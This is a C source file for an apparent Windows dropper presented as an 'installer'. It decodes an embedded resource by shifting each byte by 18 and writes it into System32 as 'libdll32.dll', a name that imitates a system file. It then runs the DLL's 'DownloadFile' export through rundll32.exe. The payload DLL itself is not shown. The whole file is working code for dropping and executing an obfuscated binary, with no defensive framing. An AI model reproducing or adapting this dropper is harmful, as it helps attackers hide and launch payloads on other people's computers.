#include "installer.h"
#include "resource.h"

#define DLL_NAME L"libdll32.dll"
#define DLL_FUNCTION L"DownloadFile"

int main(int argc, char** argv) {
	printf("Finding resource\n");
	HRSRC resourceHandle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!resourceHandle) {
		consoleError(GetLastError(), L"FindResourceW");
		return 1;
	}

	DWORD resourceSize = SizeofResource(NULL, resourceHandle);

	if(!resourceSize) {
		consoleError(GetLastError(), L"SizeofResource");
		return 1;
	}

	printf("Resource size: %lu byte(s)\nLoading resource\n", resourceSize);
	HGLOBAL resource = LoadResource(NULL, resourceHandle);

	if(!resource) {
		consoleError(GetLastError(), L"LoadResource");
		return 1;
	}

	BYTE* data = LockResource(resource);

	if(!data) {
		consoleError(GetLastError(), L"LockResource");
		return 1;
	}

	BYTE* buffer = malloc(resourceSize);

	if(!buffer) {
		consoleError(GetLastError(), L"malloc");
		return 1;
	}

	printf("Allocate memory: %lu byte(s)\n", resourceSize);

	for(DWORD i = 0; i < resourceSize; i++) {
		buffer[i] = (data[i] - 18) % 0xFF;
	}

	wchar_t* system32 = getSystem32Directory();
	printf("System32: %ws\n", system32);
	wchar_t* dllFile = mergePath(system32, DLL_NAME);
	printf("DLL: %ws\nCreate file\n", dllFile);
	HANDLE file = CreateFileW(dllFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	free(dllFile);

	if(file == INVALID_HANDLE_VALUE) {
		free(buffer);
		consoleError(GetLastError(), L"CreateFileW");
		return 1;
	}

	DWORD written = 0;
	
	if(!WriteFile(file, buffer, resourceSize, &written, NULL)) {
		free(buffer);
		consoleError(GetLastError(), L"WriteFile");
		return 1;
	}

	free(buffer);
	printf("Size:    %lu byte(s)\nWritten: %lu byte(s)\n", resourceSize, written);

	if(!CloseHandle(file)) {
		consoleError(GetLastError(), L"CloseHandle");
		return 1;
	}

	printf("File closed\n");
	wchar_t* rundll32File = mergePath(system32, L"rundll32.exe");
	free(system32);
	size_t pathLength = wcslen(rundll32File);
	size_t nameLength = wcslen(DLL_NAME);
	size_t functionLength = wcslen(DLL_FUNCTION);
	size_t argumentBufferLength = pathLength + 1 + nameLength + 1 + functionLength + 1;
	wchar_t* argumentBuffer = malloc(argumentBufferLength * sizeof(wchar_t));

	if(!argumentBuffer) {
		consoleError(ERROR_OUTOFMEMORY, L"malloc");
		return 1;
	}

	for(size_t i = 0; i < pathLength; i++) {
		argumentBuffer[i] = rundll32File[i];
	}

	argumentBuffer[pathLength] = L' ';

	for(size_t i = 0; i < nameLength; i++) {
		argumentBuffer[i + pathLength + 1] = DLL_NAME[i];
	}

	argumentBuffer[pathLength + nameLength + 1] = L',';

	for(size_t i = 0; i < functionLength; i++) {
		argumentBuffer[i + pathLength + nameLength + 2] = DLL_FUNCTION[i];
	}

	argumentBuffer[argumentBufferLength - 1] = 0;
	STARTUPINFO startupInformation = {0};
	startupInformation.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION processInformation = {0};
	printf("Running DLL File\n");

	if(!CreateProcessW(rundll32File, argumentBuffer, NULL, NULL, TRUE, 0, NULL, NULL, &startupInformation, &processInformation)) {
		free(rundll32File);
		free(argumentBuffer);
		consoleError(GetLastError(), L"CreateProcessW");
		return 1;
	}

	free(rundll32File);
	free(argumentBuffer);
	printf("Closing Handles\n");

	if(!CloseHandle(processInformation.hProcess)) {
		consoleError(GetLastError(), L"CloseHandle");
		return 1;
	}

	if(!CloseHandle(processInformation.hThread)) {
		consoleError(GetLastError(), L"CloseHandle");
		return 1;
	}

	return 0;
}
